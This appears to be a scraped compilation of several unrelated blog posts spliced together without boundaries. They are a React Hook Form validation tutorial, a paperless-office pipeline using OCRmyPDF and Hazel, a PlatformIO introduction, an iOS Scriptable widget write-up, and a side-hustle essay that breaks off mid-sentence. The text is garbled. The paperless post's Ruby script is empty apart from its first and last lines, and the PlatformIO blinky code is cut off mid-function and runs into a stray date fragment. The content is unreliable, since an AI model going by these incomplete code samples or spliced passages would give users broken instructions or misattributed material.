      <span>&lt;</span>form onSubmit<span>=</span><span>{</span>onFormSubmit<span>}</span><span>&gt;</span>
        <span>&lt;</span>label<span>&gt;</span>License number<span>&lt;</span><span>/</span>label<span>&gt;</span>
        <span>&lt;</span>input name<span>=</span><span>"licenseNo"</span> placeholder<span>=</span><span>"AA11111"</span> <span>/</span><span>&gt;</span>
        <span>&lt;</span>button<span>&gt;</span>Start parking<span>&lt;</span><span>/</span>button<span>&gt;</span>
      <span>&lt;</span><span>/</span>form<span>&gt;</span>
    <span>&lt;</span><span>/</span><span>&gt;</span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>The app contains a form with a text input and a button. We also added an <code>onSubmit</code> method that prevents the form from being submitted and the page from being refreshed. Apart from that, the app doesn't really do anything meaningful. Let's add some validation:</p>
<div data-language="javascript"><pre><code><span>export</span> <span>default</span> <span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> handleSubmit<span>,</span> register <span>}</span> <span>=</span> <span>useForm</span><span>(</span><span>)</span><span>;</span>

  <span>const</span> <span>onFormSubmit</span> <span>=</span> <span>(</span><span>data</span><span>)</span> <span>=&gt;</span> console<span>.</span><span>log</span><span>(</span>data<span>)</span><span>;</span>

  <span>return</span> <span>(</span>
    <span>&lt;</span><span>&gt;</span>
      <span>&lt;</span>h1<span>&gt;</span>Parking App<span>&lt;</span><span>/</span>h1<span>&gt;</span>
      <span>&lt;</span>form onSubmit<span>=</span><span>{</span><span>handleSubmit</span><span>(</span>onFormSubmit<span>)</span><span>}</span><span>&gt;</span>
        <span>&lt;</span>label<span>&gt;</span>License number<span>&lt;</span><span>/</span>label<span>&gt;</span>
        <span>&lt;</span>input name<span>=</span><span>"licenseNo"</span> placeholder<span>=</span><span>"AA11111"</span> ref<span>=</span><span>{</span>register<span>}</span> <span>/</span><span>&gt;</span>
        <span>&lt;</span>button<span>&gt;</span>Start parking<span>&lt;</span><span>/</span>button<span>&gt;</span>
      <span>&lt;</span><span>/</span>form<span>&gt;</span>
    <span>&lt;</span><span>/</span><span>&gt;</span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>As you can see, we don't need to add much code to set up React Hook Form. We have to call the <code>useForm</code> hook which returns a bunch of methods. For the time being, we simply use <code>handleSubmit</code> and <code>register</code>. We then wrap the <code>onFormSubmit</code> method into the <code>handleSubmit</code> method. This will take care of only invoking <code>onFormSubmit</code> and pass the form data when all fields are valid (it also prevents the form from submitting, so we don't need to explicitly call the <code>preventDefault</code> method). Finally, we need to set the <code>register</code> method as the input field's ref attribute. But this is not the end of the story! The form allows any input, even if it is left empty. This is why we have to specify some validation rules:</p>
<div data-language="javascript"><pre><code><span>&lt;</span>input 
  name<span>=</span><span>"licenseNo"</span> 
  placeholder<span>=</span><span>"AA11111"</span> 
  ref<span>=</span><span>{</span><span>register</span><span>(</span><span>{</span>
    required<span>:</span> <span>"You must enter a license number."</span><span>,</span>
    pattern<span>:</span> <span>{</span>
      value<span>:</span> <span>/^[a-z]{2}\d{5}$/i</span><span>,</span>
      message<span>:</span> <span>"The license number must be a combination of two letters and five digits."</span>
    <span>}</span>
  <span>}</span><span>)</span><span>}</span>
<span>/</span><span>&gt;</span></code></pre></div>
<p>When registering the input field, we can add several options to adjust how the field should be validated. In the above example, we tell our form that the field is required and that the value must match a specific regex pattern. We also define some error messages. If we try to submit the form, but validation fails, the error message is returned by <code>useForm</code> as an object called <code>errors</code>. Every form field gets its own error message corresponding to the field's <code>name</code> attribute:</p>
<div data-language="javascript"><pre><code><span>{</span>errors<span>.</span>licenseNo <span>&amp;&amp;</span> errors<span>.</span>licenseNo<span>.</span>message<span>}</span></code></pre></div>
<p>Alternatively, we can use a simple component, <code>ErrorMessage</code> (we must first install a separate NPM package):</p>
<div data-language="javascript"><pre><code><span>&lt;</span>ErrorMessage
  errors<span>=</span><span>{</span>errors<span>}</span>
  name<span>=</span><span>"licenseNo"</span>
<span>/</span><span>&gt;</span></code></pre></div>
<p>This is all we need to avoid registering an invalid license number! However, there are some more concepts we should have a look at.</p>
<h2>Controlled vs. Uncontrolled</h2>
<p>React Hook Form is designed to work best with <em>uncontrolled components</em>. This means that form data is handled by the DOM itself and can be accessed directly using refs (which is why we put the <code>register</code> method there). <em>Controlled components</em> on the other hand, use event handlers such as <code>onChange</code> to update values at state change. Many third-party libraries use controlled components, and luckily there is a way we can use those together with React Hook Form:</p>
<div data-language="javascript"><pre><code><span>&lt;</span>Controller
  <span>as</span><span>=</span><span>{</span>ReactSelect<span>}</span>
  name<span>=</span><span>"fuelType"</span>
  rules<span>=</span><span>{</span><span>{</span> required<span>:</span> <span>"You must select a fuel type."</span> <span>}</span><span>}</span>
  options<span>=</span><span>{</span><span>[</span>
    <span>{</span> value<span>:</span> <span>"electric"</span><span>,</span> label<span>:</span> <span>"Electric"</span> <span>}</span><span>,</span>
    <span>{</span> value<span>:</span> <span>"petrol"</span><span>,</span> label<span>:</span> <span>"Petrol"</span> <span>}</span><span>,</span>
    <span>{</span> value<span>:</span> <span>"diesel"</span><span>,</span> label<span>:</span> <span>"Diesel"</span> <span>}</span>
  <span>]</span><span>}</span>
  isClearable
<span>/</span><span>&gt;</span></code></pre></div>
<p>We add a <a href="https://github.com/JedWatson/react-select">React Select</a> for choosing the cars fuel type by wrapping it inside a <code>Controller</code> component using the <code>as</code> prop. The Controller automatically injects the <code>onChange</code>, <code>onBlur</code> and <code>value</code> props into the wrapped component. The same applies to other props that may be required by the underlying component (in this case the props <code>options</code> and <code>isClearable</code>). Validation rules are applied by setting the <code>rules</code> prop. Although this is the preferred syntax, you sometimes need to use the <code>render</code> prop instead of the <code>as</code> prop, which lets you customize events, value and ref:</p>
<div data-language="javascript"><pre><code><span>&lt;</span>Controller
  name<span>=</span><span>"fuelType"</span>
  rules<span>=</span><span>{</span><span>{</span> required<span>:</span> <span>"You must select a fuel type."</span> <span>}</span><span>}</span>
  render<span>=</span><span>{</span><span>(</span><span><span>{</span> onChange<span>,</span> onBlur<span>,</span> value<span>,</span> ref <span>}</span></span><span>)</span> <span>=&gt;</span> <span>(</span>
    <span>&lt;</span>ReactSelect
      options<span>=</span><span>{</span><span>[</span>
        <span>{</span> value<span>:</span> <span>"electric"</span><span>,</span> label<span>:</span> <span>"Electric"</span> <span>}</span><span>,</span>
        <span>{</span> value<span>:</span> <span>"petrol"</span><span>,</span> label<span>:</span> <span>"Petrol"</span> <span>}</span><span>,</span>
        <span>{</span> value<span>:</span> <span>"diesel"</span><span>,</span> label<span>:</span> <span>"Diesel"</span> <span>}</span>
      <span>]</span><span>}</span>
      onChange<span>=</span><span>{</span>onChange<span>}</span>
      onBlur<span>=</span><span>{</span>onBlur<span>}</span>
      inputValue<span>=</span><span>{</span>value<span>?.</span>key<span>}</span>
      inputRef<span>=</span><span>{</span>ref<span>}</span>
    <span>/</span><span>&gt;</span>
  <span>)</span><span>}</span>
<span>/</span><span>&gt;</span></code></pre></div>
<h2>Form Context</h2>
<p>When moving input fields to shared components in order to make them reusable, you can of course pass all neccessary methods from <code>useForm</code> as props. In many cases, it would be a more elegant solution to put the whole form into a <code>FormProvider</code> and access the context of the form with <code>useformContext</code>:</p>
<div data-language="javascript"><pre><code><span>const</span> methods <span>=</span> <span>useForm</span><span>(</span><span>)</span><span>;</span>

<span>return</span> <span>(</span>
    <span>&lt;</span>FormProvider <span>{</span><span>...</span>methods<span>}</span><span>&gt;</span>
      <span>&lt;</span>form onSubmit<span>=</span><span>{</span>methods<span>.</span><span>handleSubmit</span><span>(</span>onSubmit<span>)</span><span>}</span><span>&gt;</span>
        <span>&lt;</span>LicenseNoInput <span>/</span><span>&gt;</span>
        <span>&lt;</span>button<span>&gt;</span>Start parking<span>&lt;</span><span>/</span>button<span>&gt;</span>
      <span>&lt;</span><span>/</span>form<span>&gt;</span>
    <span>&lt;</span><span>/</span>FormProvider<span>&gt;</span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>The <code>LicenseNoInput</code> component can then access the form methods as simple as this:</p>
<div data-language="javascript"><pre><code><span>const</span> <span>{</span> errors<span>,</span> register <span>}</span> <span>=</span> <span>useFormContext</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Let's pack it all up, add a little more logic and styling and voilà – we have a parking app with form validation that actually works!</p>

<h2>Like a Swiss Army Knife</h2>
<p>There is so much more you can do with React Hook Form! It's too bad I can't cover it all in a single article. I can recommend a look at the <a href="https://react-hook-form.com/api/">official documentation</a>, which also provides many useful examples. Personally, I have been using this tool for about a year now and have never been in a situation where it couldn't solve a problem. If you are still not convinced, the fact that TypeScript is fully supported will hopefully change your mind.</p></section></article></div>]]>

  <div itemprop="articleBody">
    <p>The time of binders full of invoices and other documents is over.
At least for me.</p>

<p>Almost all of my personal home office is paperless these days. However almost everything still <em>arrives</em> on paper.
This article tells you how I deal with it.</p>

<!--more-->

<h2 id="the-goal">The goal</h2>

<p>My ultimate goal is to have as little paper documents as possible. A few things are too important to throw away, like important contracts or bank account credentials, but everything else should be stored digitally.</p>

<p>After looking at a few full blown document management solutions I switched to a very simple system: Storing the documents as PDFs in a regular folder structure.</p>

<h2 id="the-pipeline">The pipeline</h2>

<h3 id="step-one-paper-to-pdf">Step one: Paper to PDF</h3>

<p>I still get documents in paper by post.</p>

<p>So the first step is my scanner: An Epson WorkForce multi functional printer.
The document scanner within the device has the nice functionality to directly store the scanned documents in the cloud.</p>

<p>My cloud storage provider is Google Drive, so when scanning a document it is automatically uploaded to the folder <code>Inbox/Scanner/Raw</code> in my Google Drive account.</p>

<p><img src="https://dev.betterdoc.org/assets/img-posts/paperless-home-office-epson-workforce.jpg" alt="My scanner"></p>

<h3 id="step-two-optimizing-the-pdf">Step two: Optimizing the PDF</h3>

<p>The PDF generated by the Epson WorkForce isn’t really optimized yet (neither in terms of size nor in terms of content).</p>

<p>I found a nice little tool called <a href="https://github.com/jbarlow83/OCRmyPDF">OCRmyPDF</a> which can enhance a scanned PDF so that not only the scanned image is contained inside it but also all text from that image via OCR - a nice addition for searching within a document and also an easy way to copy textual information out of a PDF.
OCRmyPDF is also able to compress an image inside a PDF significantly, so that the resulting document not only contains the text  but in addition is only about 60% of it’s original size.</p>

<p>So I want to run all PDF documents created by the scanner through OCRmyPDF.</p>

<p>As the name suggests the <code>Raw</code> folder is only an intermediary storage location designed for exactly this purpose: Have an inbox of PDFs that still need to be optimized.
Once the optimization is complete the PDFs should be moved to the <code>Processed</code> folder.</p>

<p>The following script applies OCRmyPDF and moves the optimized PDFs from the <code>Raw</code> folder to the <code>Processed</code> folder:</p>

<div><div><pre><code><span>#!/usr/bin/env ruby</span>

<span>end</span>
</code></pre></div></div>

<h3 id="step-three-automating-the-conversion">Step three: Automating the conversion</h3>

<p>To make sure that the script is run automatically on each file that arrives in the <code>Raw</code> folder I use another little tool: <a href="https://www.noodlesoft.com/">Hazel</a>.
Hazel runs silently in the background of my machine.
It is configured to listen to any changes made to the <code>Raw</code> directory and then invoke the script listed above for all files it detects.</p>

<p><img src="https://dev.betterdoc.org/assets/img-posts/paperless-home-office-hazel.png" alt="Hazel"></p>

<h2 id="summary">Summary</h2>

<p>Voila, the pipeline is complete:</p>
<ol>
  <li>The scanner reads the document and stores in into Google Drive so it’s automatically synchronized to my local machine.</li>
  <li>Hazel detects new files and calls the conversion script.</li>
  <li>The conversion script optimizes the PDF and moves it into the target folder.</li>
</ol>

<p>The only thing that is not yet automated is sorting the document into a target folder based on its content (e.g. invoices should be moved into the <code>Invoices</code> folder while documents from my health insurance should be moved into the <code>Healthinsurance</code> folder).</p>

<p>Nevertheless this eases a lot of my pain in managing my personal documents.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        <p>A few weeks ago, <a href="https://interrupt.memfault.com/blog/the-best-and-worst-mcu-sdks">I wrote about MCU SDKs</a> and how frustrating I sometimes found
it to be confronted with one Eclipse-based IDE after another. If you haven’t
read my latest updates to that post, check it out!</p>

<p>But what if I told you that there exists an embedded project management tool
which ties you neither to a toolchain, nor to a development environment? Did I
mention it is available for Windows, Linux, and Mac?</p>

<!-- excerpt start -->

<p>In this post, I’d like to introduce PlatformIO. I will go over what PlatformIO
is, how you can use it for your project, and what it is good at.  I also
highlight a few shortcomings worth keeping in mind.</p>

<!-- excerpt end -->

<p>While I am not ready to give PlatformIO a full-throated endorsement for all
projects, it works very well for specific platforms and RTOS-es. Most
importantly, it proposes an approach to library and toolchain management for
embedded that is the best I’ve seen yet. I hope you will give it a whirl!</p>

<h2 id="what-is-platformio">What is PlatformIO?</h2>

<p><a href="https://platformio.org/" target="_blank">PlatformIO</a> is a set of open source tools targetted at professional embedded
developers.  Foremost of those tools is the PlatformIO Plugin for VSCode which
is used by hundreds of thousands of embedded developers to create, compile,
debug, and test embedded projects.</p>

<p>At its core, PlatformIO is made up of the following subsystems:</p>
<ol>
  <li>Project management: a tool to create, configure, and manage projects</li>
  <li>Package management: a registry and a client to host libraries for embedded
systems and easily add or remove them from a project</li>
  <li>Build system: a build configuration and execution system. PlatformIO replaces
make, cmake, and others.</li>
  <li>Workflow automation: automation and integrations to debug, run unit tests,
run static analyzers, and other tools for your project.</li>
</ol>

<p>When it works, PlatformIO is magical. Want to start a project for STM32
STM32Cube, compiled with ARM GCC 5.2.1? No need to go find an SDK online, Simply
tweak a few configurations files, run a few CLI commands, and you’re off too the
races. We do this in the next section of this article.</p>

<p>However, the set of supported targets can be hit or miss.</p>

<h3 id="supported-targets">Supported Targets</h3>

<p>PlatformIO defines targets as a combination as three components:</p>
<ol>
  <li>The “platform”, which is the MCU family. For example, both the STM32 and the
nRF52 are supported platforms.</li>
  <li>The “framework”, which is the SDK being used on the project. This includes
vendor SDK, such as the STM32Cube, as well as RTOS-es such as Zephyr or
FreeRTOS, true frameworks such as Arduino, and alternative APIs such as
libopencm3 and CMSIS.</li>
  <li>The “board” which defines the specific board you are using. PlatformIO comes
with hundreds of board configuration for popular development boards like the
STM32 Discovery boards.</li>
</ol>

<p>The headline numbers are impressive: 41 platforms, 23 frameworks, and 924 boards
as of this writing.</p>

<p>However, reality is a bit less rosy: while some MCU families are extremely well
covered, others have very little support.</p>

<p>One important example is official vendor SDK. PlatformIO only supports the
vendor SDKs for the following MCUs, which it considers individual “frameworks”:</p>
<ul>
  <li>Espressif family (ESP8266, ESP32)</li>
  <li>Kendryte K210</li>
  <li>STM32</li>
  <li>Gigadevice GD32V</li>
  <li>SiFive FE310 and FU540</li>
</ul>

<p>If you are able to piggy back on an RTOS, things look a bit better. For example,
you can create a Zephyr project with PlatformIO for Atmel SAM, Freescale
Kinetis, Nordic nRF5, NXP iMX RT, NXP LPC, Silabs EFM32, and STM32.</p>

<p>You can use the PlatformIO client to list supported frameworks, platforms, and
boards. The list changes regularly, as the project is very active. Here’s the
command you want to run:</p>

<div><div><pre><code>  # List platforms
  $ pio platform search
  
  # List frameworks
  $ pio platform frameworks
  
  # List boards
  $ pio boards
</code></pre></div></div>

<h3 id="package-management">Package Management</h3>

<p>PlatformIO hosts a registry of embedded libraries which can be added to every
project. Popular libraries like the lwIP networking stack, the nanopb protocol
buffer implementation, or the mbedTLS SSL library are all available in one form
or another.</p>

<p>Here again, it is magical when it works. Simply add a library to your project by
calling <code>pio lib install</code> and rebuild your project. PlatformIO will fetch the
correct bundle, compile a static library, link it into your project, and expose
the header files.</p>

<p>However, the same issue with supported targets gets in the way of using
libraries. Each library lists frameworks and platforms it is compatible with,
and if yours is not listed you cannot use it. Of the more than 10,000 libraries
in the registry, only about 139 of them are compatible with the STM32 +
STM32Cube combo.</p>

<p>Anyone can publish a library to the repository, by following the excellent
online documentation<sup id="fnref:library_docs"><a href="#fn:library_docs">1</a></sup>.</p>

<p>Looking for packages is done with the <code>pio lib search</code> command. Here are a few
examples:</p>

<div><div><pre><code># Look for all libraries that support STM32 + STM32Cube
$ pio lib search -p stm32 -f STM32Cube
...
# Look for mbedtls
$ pio lib search -n mbedtls
...
</code></pre></div></div>

<p>Installing them is done with the <code>pio install</code> command.</p>

<h3 id="build-system">Build System</h3>

<p>PlatformIO is an opinionated system, and as long as you follow its rules
building a project with it is seamless. Simply add your project source under
<code>src</code>, your header files under <code>include</code>, and your private libraries under
<code>lib</code>. Run <code>pio run</code>, and you’re cooking with gas!</p>

<p>Under the hood, it uses the SCons<sup id="fnref:scons"><a href="#fn:scons">2</a></sup> build system. Most of the
time, this is of no consequence to the user as plenty of configuration options
are exposed via the <code>platformio.ini</code> file used to configure each project.</p>

<p>For example, you can change compiler and linker flags by adding the
<code>build_flags</code> variable to your <code>platformio.ini</code>:</p>

<div><div><pre><code>[env:release]
platform = ststm32
board = disco_f429zi
framework = stm32cube
build_flags = -Wall -Wl,--gc-sections
</code></pre></div></div>

<p>Should you need to customize your build beyond what the <code>.ini</code> file provides,
you will need to write SCons scripts which are invoked by the PlatformIO build
environment. SCons scripts are written in Python.</p>

<p>Two hooks are available for those scripts: a PRE hook which runs before the
build executes, a POST hook which runs after the build. You can use these hooks
to change the build instructions for individual files, pre-process some source
code, or post-process the build artifacts<sup id="fnref:advanced_scripting"><a href="#fn:advanced_scripting">3</a></sup>.</p>

<p>While some may chafe at the need to learn yet another build system - I for one
still like my Makefiles - SCons is a mature and powerful build system.</p>

<h2 id="getting-started-with-the-platformio-cli">Getting Started with the PlatformIO CLI</h2>

<p>My favorite way to use PlatformIO is with the CLI, also known as “PlatformIO Core”.
Although some people swear by the VSCode plugin, I prefer my PlatformIO separate
from my IDE so I can use trusty old Vim.</p>

<p>In this next section, I will walk you through installing the CLI, starting a
project, adding some libraries, and compiling your work. All code is available
in the the <a href="https://github.com/memfault/interrupt" target="_blank">Interrupt Github repository</a>,
under <code>example/platformio</code>.</p>

<h3 id="installing-the-cli">Installing the CLI</h3>

<p>Installing the PlatformIO CLI is easy. On some platform, you can use your
package manager. For example, on mac:</p>
<div><div><pre><code>$ brew install platformio
</code></pre></div></div>

<p>For all other platforms, you can use the <code>get-platformio.py</code> script, available
on their website<sup id="fnref:get-platformio"><a href="#fn:get-platformio">4</a></sup>. Download it and run it with <code>python
get-platformio.py</code>.</p>

<p>At this point, you should have <code>platformio</code> available as a CLI utility, as well
as a <code>pio</code> alias for faster use.</p>

<h3 id="creating-a-project">Creating a project</h3>

<p>The <code>pio</code> tool comes with project management commands. Let’s say we want to
start a new project for our STM32F429zi discovery board.</p>

<p>First, we’ll create a folder:</p>
<div><div><pre><code>$ mkdir my-project
$ cd my-project
</code></pre></div></div>

<p>Then, we’ll initialize the project with <code>pio project init</code>, and pass it a board
and a framework</p>

<div><div><pre><code>$ pio project init --board disco_f429zi --project-options "framework=STM32Cube"
...
Project has been successfully initialized! Useful commands:
`pio run` - process/build project from the current directory
`pio run --target upload` or `pio run -t upload` - upload firmware to a target
`pio run --target clean` - clean project (remove compiled files)
`pio run --help` - additional information
</code></pre></div></div>

<h3 id="toolchains-and-linker-scripts">Toolchains and linker scripts</h3>

<p>On many of my projects, I use a specific version of the GCC toolchain, and to
write my own linker script. You’ll have to update your <code>platformio.ini</code> to
enable both of those things:</p>

<div><div><pre><code>[env]
platform = ststm32
board = disco_f429zi
framework = stm32cube
platform_packages =
  ; GCC 4.8.4
  toolchain-gccarmnoneeabi@1.40804.0
board_build.ldscript = STM32F429ZIYX_FLASH.ld
</code></pre></div></div>

<p>The <code>board_build.ldscript</code> bit is straightforward: simply point it at the path
to your linker script within the project folder.</p>

<p>The <code>platform_packages</code> variable is more complicated. This option lets you
override the version of built-in packages, such as the support for different
Frameworks, specific toolchains, or built-in tools like OpenOCD.</p>

<p>Tool Packages can be downloaded from Github, or from Bintray where the PlatformIO
project hosts many of its binaries. For example, you can the list of available
builds of GCC at
https://bintray.com/platformio/tool-packages/toolchain-gccarmnoneeabi-darwin_x86_64#files.<sup id="fnref:gcc-versions"><a href="#fn:gcc-versions">5</a></sup></p>

<p>In my case, I specified “toolchain-gccarmnoneeabi@1.40804.0” which is GCC 4.8.4
(see the “40804” part of the package version?).</p>

<p>Using a custom built toolchain is a whole other can of worm, which requires
creating your own platform package.</p>

<h3 id="writing-some-code">Writing some code</h3>

<p>Your code should go under the <code>src</code> folder. In my case, I added a <code>main.c</code> file
and wrote a simple blinky firmware:</p>

<div><div><pre><code><span>#include "stm32f4xx_hal.h"
</span>
<span>#define LED_PIN                                GPIO_PIN_5
#define LED_GPIO_PORT                          GPIOA
#define LED_GPIO_CLK_ENABLE()                  __HAL_RCC_GPIOA_CLK_ENABLE()
</span><span>void</span> <span>LED_Init</span><span>()</span> <span>{</span>

December 08, 2020</time> - <span title="Estimated read time"> 8 mins </span> </span></p>  <p>A few weeks ago I tweeted about a healthy living widget and Shortcuts I put together with Scriptable. I got a quite a few messages asking how I made it so… here it is!</p> <blockquote><div lang="en" dir="ltr"><p>Just finished writing a baller widget and a bunch of shortcuts with <a href="https://twitter.com/scriptableapp?ref_src=twsrc%5Etfw">@scriptableapp</a> 👇</p><p>✅ Shortcuts to log when I exercise/stretch<br>✅ Persist data in iCloud<br>✅ Show in widget<br>✅ Auto text my friends at 10am if I exercised/stretched the previous day</p><p>Will probs blog about this 😎 <a href="https://t.co/ZCk5rNQCFc">pic.twitter.com/ZCk5rNQCFc</a></p></div>— Josh "Typo Maker" Holtz 💪🚀 (@joshdholtz) <a href="https://twitter.com/joshdholtz/status/1328913955843166211?ref_src=twsrc%5Etfw">November 18, 2020</a></blockquote>  <hr> <h2 id="backstory">Backstory</h2> <p>I don’t think there has been a more important time to be aware of physical and mental health. I’ve struggled most of this year to find ways of motivating myself, recording my successes, and finding ways to hold myself accountable. This hasn’t been to much of an issue in the past since I was able to leave my house to do fun physical activity but all of my workouts this year have had to be at home. It’s very easy keep sitting on the couch rather than getting up to do a home workout.</p> <p>I thankfully have an awesome group of coworkers that have formed a goal accountability group with me. The four of us meet every two weeks to talk about how we did with our goals and receive input on how to improve. My goal has been physical and mental health so that improves both my work life and my personal life.</p> <p>I don’t remember who brought this up in my group but my group members were willing to get daily notifications of my workout status from the day before. Not only would this motivate me and hold me accountable but my group members would also use this to motivate them with their goals. My first attempt at doing this was through todos in Basecamp. We had a Basecamp project for our accountability group so I created a new task for each day for two weeks that I would checkoff when I worked out. This ended up working but I wanted a solution that was easier to use, more visible on my phone, and not tied to our company Basecamp.</p> <p>One of my group members told me to make an app but… I make too many of those and I didn’t want to really support one another one 😆 I’ve been really into Shortcuts and widgets as of recent so I wanted decided that is how I wanted to make this. I knew I could make a simple menu system and store persistent data in a file but I wanted something a little more polished.</p> <p>I had luckily just discovered <a href="https://scriptable.app/">Scriptable</a> and <a href="https://datajar.app/">Data Jar</a> by <a href="https://twitter.com/simonbs">Simon</a>. Scriptable allows you you to automate and create custom widgets on iOS with Javascript and Shortcuts. Data Jar is a generic data storage for Shortcut. I knew I could just both of these to make what I wanted.</p> <p>Here is my current implementation… 😈</p> <hr> <h2 id="demo">Demo</h2> <p>There are three parts to this.</p> <ol> <li>Widget - displays a calendar-ish UI of days I exercised and stretched</li> <li>Logging Shortcut - menu shortcut that that store data and refreshes widget</li> <li>Automated Accountability Text - automated shortcut to text my coworkers whether I achieved my goals or not from the previous day</li> </ol> <h3 id="widget">Widget</h3> <p><img src="https://www.joshholtz.com/images/2020-12-08/widget.png" alt="Widget Screenshot"></p> <h3 id="logging-shortcut">Logging Shortcut</h3> <video width="100%" controls=""> <source src="https://www.joshholtz.com/images/2020-12-08/logging_shortcut.MP4" type="video/mp4"> Your browser does not support the video tag. </video> <h3 id="automated-accountability-text">Automated Accountability Text</h3> <p><img src="https://www.joshholtz.com/images/2020-12-08/text.jpg" alt="Text Screenshot"></p> <hr> <h2 id="implementation-with-scriptable-and-data-jar">Implementation with Scriptable and Data Jar</h2> <p>I went through <strong>a lot</strong> of different implementations of this. My first version had four scripts and three shortcuts. It worked but I was not happy with it. I now have one widget script, one shortcut for logging my health activities, and one shortcut that runs on an automation for sending my previous days activities to my coworkers.</p> <p>My requirements for this were:</p> <ul> <li>Persistent data stored in iCloud with dates I’ve exercised and stretched</li> <li>Widget built from persistent data</li> <li>Automated shortcut for notifying coworkers/friends my statuses from previous day</li> </ul> <h3 id="data-storage">Data Storage</h3> <p>That data format I’m storing looks like this:</p> <div><div><pre><code>{
	"Exercise": {
		"2020-12-07": "true"
	},
	"Stretching": {
		"2020-12-06": "true",
		"2020-12-07": "true"
	}
}
</code></pre></div></div> <p>Data Jar is my primary storage. It offers easy to shortcuts, viewing and editing of data in app, and syncing of data over iCloud. Both of my shortcuts fetch and update my data with Data Jar.</p> <p>One of the problems I faced with using Data Jar was no Data Jar integration inside of Scriptable. I was thinking that Scriptable would have an API to fetch data from Data Jar but it does not 🤷‍♂️ That didn’t end up being too much of a problem though. In my Shortcut, I ended up passing the data from Data Jar into my Scriptable widget through a parameter. The Scriptable script will then cache that data passed in as a parameter and save it to Scriptable’s iCloud Drive. This cached data is only ever used as a read only by the widget.</p> <h3 id="logging-shortcut-1">Logging Shortcut</h3> <p>👉 <a href="https://www.icloud.com/shortcuts/962ad0ba01da43b098eddbb3ce9390be">Install Shortcut</a></p> <p>My logging shortcut is really just a series of menus that adds/updates values in a dictionary. That dictionary is then stored in Data Jar and passed as a parameter into the Scriptable Widget.</p> <p>My Shortcut essentially looks like this:</p> <ol> <li>Logging shortcut reads and updates data with Data Jar</li> <li>Passes Data Jar data as a parameter into my widget script</li> <li>Widget script write data to a file in the Scriptable iCloud drive</li> <li>Widget UI is driven off of this file in the Scriptable iCloud drive</li> </ol> <p>⚠ Due to some OS issues, the Scriptable widget needs to be opened in Scriptable to refresh. Widgets are struggling to refresh from Shortcuts.</p> <video width="100%" controls=""> <source src="https://www.joshholtz.com/images/2020-12-08/shortcut_actions_log.MP4" type="video/mp4"> Your browser does not support the video tag. </video> <h3 id="widget-script">Widget Script</h3> <p>Scriptable’s app and API is so so nice but my javascript is not 😛 My script coudl be improved in so many ways but it works for now. Below is the high level workflow along with a gist.</p> <ul> <li>Write data to iCloud Drive (if passed in from Shortcut)</li> <li>Reads data from iCloud Drive</li> <li>Draws previous week, current week, and next week <ul> <li>Looks in exercise and stretching dictionaries for each day</li> <li>Draws salmon circle around day if exercised</li> <li>Draws blue line under day if stretched</li> </ul> </li> </ul> <p>⚠ This is <strong>ONLY</strong> designed for the medium widget right now because I made it for me and I’m lazy.</p> <p>Feel free to suggest any updates/improvements! I’d be happy to incorporate and reshare 😁</p>  <h3 id="automated-accountability-shortcut">Automated Accountability Shortcut</h3> <p>👉 <a href="https://www.icloud.com/shortcuts/7a8e8bfa63674e2c9c50beee47ff3a51">Install Shortcut</a></p> <p>My accountability shortcut reads the values from Data Jar to see if I exercised and stretched the previous day and then send that in a text message to my coworkers.</p> <p>There isn’t really much to it besides that 😇 You could easily change up the text part to an email or a tweet or whatever works best for you!</p> <video width="100%" controls=""> <source src="https://www.joshholtz.com/images/2020-12-08/shortcuts_actions_text.mov" type="video/mp4"> Your browser does not support the video tag. </video> <hr> <h2 id="final-thoughts-and-future-plans">Final Thoughts and Future Plans</h2> <p>I’ve been using this for about four weeks now and I’m super happy with the results! The Shortcut is easy to use and the widget is better looking than I thought. The automated text that gets sent to my coworkers is working out great. There is not really an easy way for me to not send that it drives me to keep working out. That little bit of added peer pressure really does help 🙃</p> <p>Although, the best part is that I just really had fun time using Scriptable 🙂 I knew Scriptable was something I would enjoy but I was slightly unsure what I could use it for and a little intimidated at how to start. It turns out… I had no reason to be intimidated. There are plenty of examples to reference for inspiration. The docs are in the editor and are very easy to use. Support is also just an email away and very responsive if you run into anything that weird!</p> <p>I will definitely be keeping my healthy living log updated going forward. I’ll be modifying it to work for multiple widget sizes and track more/other things.</p> <p>Feel free to tweet me at <a href="https://twitter.com/joshdholtz">@joshdholtz</a> if you have any questions or suggestions on what I’ve written!</p> <p>I also want to give a big shoutout to <a href="https://twitter.com/simonbs">Simon</a> for making both Scriptable and Data Jar ❤ I’m so glad I could use these existing tools so that I didn’t have to start a new Xcode project to solve my problem 😉</p>     </div> </div></div>]]>

I’ve written this on the whiteboard next to my standing desk in the home office/guitar studio/mancave/junk room.&nbsp;</p><p>I heard this statement earlier on in the year. Must have been around May or June, it instantly struck a chord with me.</p><p>Working full time and trying to get no less than 3 side hustles and a podcast off the ground is a big ask.&nbsp;</p><p>I have used the progress over perfection mantra before. It was worded slightly differently; I can’t remember the exact statement.</p><p>However, I hadn’t fully embraced the concept.&nbsp;</p><p>When it came to my core skill of software development, I could easily apply this principle.&nbsp;</p><p>Every other part of the side hustle lifestyle was still “I got to make sure this is the best it can be”.</p><h2 id="h-already-integrated-into-my-9-5"><span id="Already_Integrated_into_My_95"></span>Already Integrated into My 9-5<span></span></h2><p>Like I’ve just touched on. I’ve used progress over perfection, day to day with my software development ‘hat’ on.</p><p>I’m going to sound arrogant now. Having spent 14+ years developing software, I’m confident in my skills and the fact I can get stuff done and out the door, quicker than a lot of my “development” peers.</p><p>By using this principle, I can get the feature ‘X’ out to the world. Start feature ‘Y’ and deliver that in rapid time. Same too with Feature ‘Z’</p><p>Then go back to feature ‘X’ and make it better. Progress over perfection in action.</p><h3 id="h-progress-over-perfection-a-real-world-app-example"><span id="Progress_Over_Perfection_%E2%80%93_A_Real_World_App_Example"></span>Progress Over Perfection – A Real World App Example<span></span></h3><p>I’m writing this post towards the end of 2020, having gone through the Coronavirus pandemic.</p><p>At the start of lockdown, I had more spare time and I came up with a <a href="https://baitcamp.net/">mobile app idea for a hobby of mine, fishing</a>.&nbsp;</p><p>After doing a bit of product validation and finding out what other fishermen would like to see in the app. I sketched out the features I was going to include in version 1 of the app.</p><p>One of the features was to allow the user to upload photos to the app, linking them to a fishing trip.</p><p>Having never done anything like this before, it was a learning curve, to say the 